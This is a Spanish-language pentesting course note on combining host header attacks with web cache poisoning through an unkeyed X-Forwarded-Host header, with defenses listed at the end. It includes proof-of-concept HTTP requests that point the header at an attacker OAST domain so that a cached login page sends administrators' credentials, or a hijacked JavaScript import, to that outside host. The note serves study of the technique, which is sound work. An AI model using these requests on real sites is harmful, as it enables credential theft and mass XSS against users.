---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - HTTP/Host-Header
Descripción: "Aquí convergen los dos bloques del módulo: un host header attack que, por sí solo, no era explotable (no puedes forzar el Host del navegador de la víctima) se weaponiza con web…"
Fecha de actualización: 2026-07-14
Nota previa: "[[08 - Password Reset Poisoning]]"
Nota siguiente: "[[10 - Bypass de validación del Host Header]]"
Area: "[[HTTP Misconfigurations.base|HTTP Misconfigurations]]"
---
---

Aquí convergen los dos bloques del módulo: un [[06 - Introducción a los Host Header Attacks|host header attack]] que, por sí solo, no era explotable (no puedes forzar el `Host` del navegador de la víctima) se **weaponiza** con [[01 - Introducción a Web Cache Poisoning|web cache poisoning]]. La clave es una **override header unkeyed**.

# El problema y la grieta

Si la app usa una cabecera **unkeyed** para construir enlaces absolutos, la caché se puede envenenar. Pero el `Host` normalmente **es keyed** (forma parte de la cache key), así que envenenar por `Host` es imposible: la víctima usa su propio `Host`, con una cache key distinta a la tuya. <mark style="background: #FFB86CA6;">La grieta aparece cuando la app soporta **override headers** y estas **no** están en la cache key</mark>.

# Identificación

Sobre una vista de login: el path y el `Host` son **keyed**, no hay parámetros GET. La app usa el `Host` para construir la URL absoluta de un **import de JavaScript** y del **`action`** del formulario de login. Como el `Host` es keyed, no basta. Pero al inyectar override headers, <mark style="background: #FF5582A6;">la app **prefiere `X-Forwarded-Host`** sobre el `Host`, y `X-Forwarded-Host` resulta **unkeyed**</mark>:

```http
GET /login.php HTTP/1.1
Host: admin.hostheaders.htb          ← keyed; también sirve de cache buster con un valor fresco
X-Forwarded-Host: attacker.oast.fun   ← unkeyed y reflejado en los enlaces → envenena la caché
```

La respuesta cacheada bajo la key legítima construye ahora los enlaces con **tu** dominio.

# Explotación: dos primitivas potentes

Como el input malicioso alimenta un import de JS y el `action` del formulario, hay dos caminos:

1. **Secuestro del import de JS → XSS masivo**: apunta el `<script src>` a tu servidor, sirve un `.js` malicioso, y <mark style="background: #FFB86CA6;">ejecutas JavaScript en el navegador de **todos** los usuarios</mark> que reciban la respuesta cacheada — un [[02 - XSS Reflejado|XSS]] persistente y sin interacción.
2. **Secuestro del `action` del formulario → robo de credenciales**: apunta el `action` del login a tu servidor y espera a que un usuario envíe el formulario; sus credenciales viajan a ti.

```http
# PoC (primitiva 2): capturar credenciales del admin al loguearse
GET /login.php HTTP/1.1
Host: admin.hostheaders.htb
X-Forwarded-Host: cf187gp2....oast.fun
```

Se envía **dos veces** (la segunda debe ser `HIT`), se espera un login, y en el log de Interactsh/Collaborator aparecen las credenciales del administrador. En un objetivo real, el `Host` es obvio (`www.target.com`); solo necesitas conocer la URL pública.

> [!success] Por qué esto es de alto impacto
> Combinar override header unkeyed + import/form controlable convierte un reflejo "inofensivo" del `Host` en <mark style="background: #FF5582A6;">XSS almacenado para todos los usuarios o cosecha masiva de credenciales</mark>, sin ninguna interacción de la víctima más allá de visitar la página. Es un patrón clásico de la investigación de James Kettle y un hallazgo de severidad alta en bug bounty.

> [!warning] El cache buster va en el `Host`
> Como el `Host` es keyed, úsalo como **cache buster**: un valor fresco por prueba te da tu propio carril de caché y evita envenenar a usuarios reales mientras afinas el `X-Forwarded-Host`. Repasa la mecánica en [[03 - Ataques de Web Cache Poisoning#Cache Busters como medida de seguridad (no solo de precisión)|cache busters]].

# Defensa

- **No** construir enlaces absolutos desde el `Host` **ni** desde override headers: usar un dominio de **configuración**.
- Si se necesita el `Host`, **validarlo contra allowlist** y **eliminar** las override headers en el borde (o incluirlas en la cache key para que no sean un vector silencioso).
- Tratar `X-Forwarded-Host` y compañía como **input no confiable**. Detalle completo en [[11 - Detección, herramientas y prevención de Host Header Attacks]].

## Referencias

- [PortSwigger — Host header + web cache poisoning](https://portswigger.net/web-security/host-header/exploiting#web-cache-poisoning-via-the-host-header)
- [James Kettle — Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
